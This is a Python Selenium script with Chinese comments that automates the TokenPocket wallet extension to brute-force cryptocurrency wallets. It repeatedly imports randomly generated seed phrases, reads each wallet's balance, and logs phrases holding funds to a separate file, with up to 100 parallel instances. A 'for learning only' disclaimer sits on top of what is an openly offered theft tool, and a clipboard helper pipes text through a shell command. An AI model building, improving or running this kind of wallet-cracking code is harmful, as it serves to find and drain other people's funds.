from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import subprocess
import random
import logging
import sys
import os
from mnemonic import Mnemonic
import threading
def copy2clip(txt):
    cmd='echo '+txt.strip()+'|clip'
    return subprocess.check_call(cmd, shell=True)
logging.getLogger('selenium.webdriver.common.selenium_manager').setLevel(logging.ERROR)
from mnemonic import Mnemonic
# 校验助记词是否合法
def is_valid_mnemonic(mnemonic):
    mnemo = Mnemonic("english")
    return mnemo.check(mnemonic)
def load_wordlist():
    with open("english.txt", "r") as file:
        words = file.read().splitlines()
    return words
def generate_mnemonic2():
    mnemo = Mnemonic("english")
    # 生成随机种子
    seed = os.urandom(16)  # 使用 16 字节的随机种子
    # 生成24个助记词
    mnemonic = mnemo.to_mnemonic(seed)
    return mnemonic
# 随机生成12个助记词
def generate_mnemonic():
    wordlist = load_wordlist()  # 加载单词表
    mnemonic = " ".join(random.choice(wordlist) for _ in range(12))  # 随机选择12个单词
    return mnemonic

# 获取 BSC 配置

js = "arguments[0].click();"
def CHENGXU(auth_code1):


    while True:
        try:
            opt = Options()
            opt.add_argument("--disable-gpu")
            opt.add_argument("--no-sandbox")
            opt.add_argument("--disable-dev-shm-usage")
            opt.add_argument("--disable-software-rasterizer")
            opt.add_argument("--window-size=400,800")
            opt.add_argument("--force-device-scale-factor=0.6")
            opt.add_extension(EXTENSION_PATH)
            driver = webdriver.Chrome(options=opt)
           
            # 打开扩展的 popup 页面

            WebDriverWait(driver, 15).until(EC.new_window_is_opened(driver.window_handles))

            try:
                time.sleep(5)
                driver.switch_to.window(driver.window_handles[2])
    
                #导入已有钱包
                elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div/div[4]/div/div[1]/div/div/span')))
                driver.execute_script(js, elem)
            except:
                driver.switch_to.window(driver.window_handles[1])
    
                #导入已有钱包
                elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div/div[4]/div/div[1]/div/div/span')))
                driver.execute_script(js, elem)
            time.sleep(0.1)
            #输入密码
            WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div[3]/form/div[5]/div/div/div/span/input'))).send_keys(password)   

            WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div[3]/form/div[6]/div/div/div/span/input'))).send_keys(password)

            #点击下一步
            elem = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div[3]/form/div[8]/div/div/div/div/button')))     
            driver.execute_script(js, elem)


            #输入助记词
            if auth_code1== "2":
                while True:
                    mnemonic = generate_mnemonic2()
              
                    if is_valid_mnemonic(mnemonic):
              
                        
                        break
            else:
                mnemonic = generate_mnemonic()
            copy2clip(mnemonic)
            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[4]/div/div[2]/form/div[1]/div/div/div/span/span/input')))
                
            elem.send_keys(Keys.CONTROL + 'v')
            
            #点击导入
            elem = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[5]/button')))     
            driver.execute_script(js, elem)
            time.sleep(1)
            while True:

                try:

                    elem = driver.find_element(by = By.XPATH, value= '/html/body/div/div/div/div[4]/div/div[3]')

                    mnemonic = generate_mnemonic()
                
                    copy2clip(mnemonic)
                    
                    elem = driver.find_element(by = By.XPATH, value= '/html/body/div/div/div/div[4]/div/div[2]/form/div[1]/div/div/div/span/span/input')
                    driver.execute_script("arguments[0].value = '';", elem)
                    elem.send_keys(Keys.CONTROL + 'v')
                    #点击导入
                    elem = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[5]/button')))     
                    driver.execute_script(js, elem)
                    time.sleep(0.5)

                except Exception as e:
                    #进入钱包
                    elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[4]/button')))
                    driver.execute_script(js, elem)
                    
                    time.sleep(5)
                    elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[3]/div/div[1]/div[1]/div/div[2]/div/div[1]/div/div/div/span[2]')))
                    usd1 = elem.text.split()

                    price_str = usd1[0]
                    price_str = price_str.replace('[', '').replace(']', '').replace("'", '').replace('$', '').strip()
            
                    if price_str=="~":
                        time.sleep(7)
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[3]/div/div[1]/div[1]/div/div[2]/div/div[1]/div/div/div/span[2]')))
                        usd1 = elem.text.split()

                        price_str = usd1[0]
                        price_str = price_str.replace('[', '').replace(']', '').replace("'", '').replace('$', '').strip()
        
                    if price_str=="~":
                        price_str="0"
                    
                    # 将处理后的字符串转换为浮点数
                    price_float = float(price_str)
            
                    print(f"助记词:{mnemonic}  余额:{price_float}")
                    if  price_float>0:
                        logging.basicConfig(filename=log_file_path2, level=logging.INFO)                
                        # 在控制台输出和写入日志文件
                        logging.info(f'TokenPocket" :{mnemonic} "余额":{price_float}')    
    
                    else:
                        logging.basicConfig(filename=log_file_path, level=logging.INFO)                
                        # 在控制台输出和写入日志文件
                        logging.info(f'TokenPocket" :{mnemonic} "余额":{price_float}')  
                    for handler in logging.root.handlers[:]:
                        handler.close()  # 关闭处理器
                        logging.root.removeHandler(handler)  # 移除处理器

                    while True: 
                        #点击账号
                        
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div[2]/div[1]/div/div/div[1]/div[1]')))
                        driver.execute_script(js, elem)

                        #添加钱包
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[2]/div/div[2]/div/div/div[2]/div/div/div[3]/div/div/div[1]')))
                        driver.execute_script(js, elem)

                        #导入钱包
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div[4]/div')))
                        driver.execute_script(js, elem)


                        #输入助记词
                        if auth_code1== "2":
                            while True:
                                mnemonic = generate_mnemonic2()
                        
                                if is_valid_mnemonic(mnemonic):
                        
                                    
                                    break
                        else:
                            mnemonic = generate_mnemonic()
                        copy2clip(mnemonic)
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[4]/div/div[2]/form/div[1]/div/div/div/span/span/input')))
                            
                        elem.send_keys(Keys.CONTROL + 'v')
       
                        #点击导入
                        elem = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[5]/button')))     
                        driver.execute_script(js, elem)
                        time.sleep(1)
                        while True:

                            
                            try:

                                elem = driver.find_element(by = By.XPATH, value= '/html/body/div/div/div/div[4]/div/div[3]')

                                mnemonic = generate_mnemonic()
                            
                                copy2clip(mnemonic)
                                
                                elem = driver.find_element(by = By.XPATH, value= '/html/body/div/div/div/div[4]/div/div[2]/form/div[1]/div/div/div/span/span/input')
                                driver.execute_script("arguments[0].value = '';", elem)
                                elem.send_keys(Keys.CONTROL + 'v')
                                #点击导入
                                elem = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[5]/button')))     
                                driver.execute_script(js, elem)
                                time.sleep(0.5)
                            except:
                                break
                        #进入钱包
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[4]/button')))
                        driver.execute_script(js, elem)
                        
                        time.sleep(5)
                        elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[3]/div/div[1]/div[1]/div/div[2]/div/div[1]/div/div/div/span[2]')))
                        usd1 = elem.text.split()

                        price_str = usd1[0]
                        price_str = price_str.replace('[', '').replace(']', '').replace("'", '').replace('$', '').strip()
                        if price_str=="~":
                            time.sleep(7)
                            elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div/div/div[3]/div/div[1]/div[1]/div/div[2]/div/div[1]/div/div/div/span[2]')))
                            usd1 = elem.text.split()

                            price_str = usd1[0]
                            price_str = price_str.replace('[', '').replace(']', '').replace("'", '').replace('$', '').strip()
    
                        if price_str=="~":
                            price_str="0"
                        # 将处理后的字符串转换为浮点数
                        price_float = float(price_str)
                        print(f"助记词:{mnemonic}  余额:{price_float}")
                        if  price_float>0:
                            logging.basicConfig(filename=log_file_path2, level=logging.INFO)                
                            # 在控制台输出和写入日志文件
                            logging.info(f'TokenPocket" :{mnemonic} "余额":{price_float}')    
        
                        else:
                            logging.basicConfig(filename=log_file_path, level=logging.INFO)                
                            # 在控制台输出和写入日志文件
                            logging.info(f'TokenPocket" :{mnemonic} "余额":{price_float}')  
                        for handler in logging.root.handlers[:]:
                            handler.close()  # 关闭处理器
                            logging.root.removeHandler(handler)  # 移除处理器
                        
        except:
            driver.quit()

#----------------------------------------------------------------------
mmdrza = '''
声明：本程序仅供学习，请勿用于非法用途。                                                                                                 
'''
print(mmdrza)
password = "Aa123456!"
looper = 0
#打包文件路径
script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
# 运行 c2demo.exe 并传递参数
EXTENSION_PATH = os.path.join(script_dir, "TokenPocket.crx")
log_file_path=os.path.join(script_dir, "TokenPoctet钱包余额记录.txt")
log_file_path2=os.path.join(script_dir, "TokenPoctet钱包有钱余额记录.txt")

while True:
    auth_code1 = input("请选择：1、单开模式 2、多开模式（点击Enter确认）: ")
    if auth_code1 in ("1", "2"):
        break
    print("请输入数字1或者数字2进行选择！")

if auth_code1 == "2":
    while True:
        auth_code2 = input("请输入多开数量（1~100）（点击Enter确认）: ")
        if auth_code2.isdigit() and 1 <= int(auth_code2) <= 100:
            auth_code2 = int(auth_code2)
            break
        print("请输入数字1~100！")

    # 多进程启动多个 CHENGXU()
    threads = []
    for _ in range(auth_code2):
        
        p = threading.Thread(target=CHENGXU, args=(auth_code1))
        p.daemon= True
        p.start()
        threads.append(p)
        time.sleep(2)
    # 等待所有进程完成（可选）
    while True:
        time.sleep(1)

else:
    CHENGXU(auth_code1)  # 单开模式直接运行一次



        

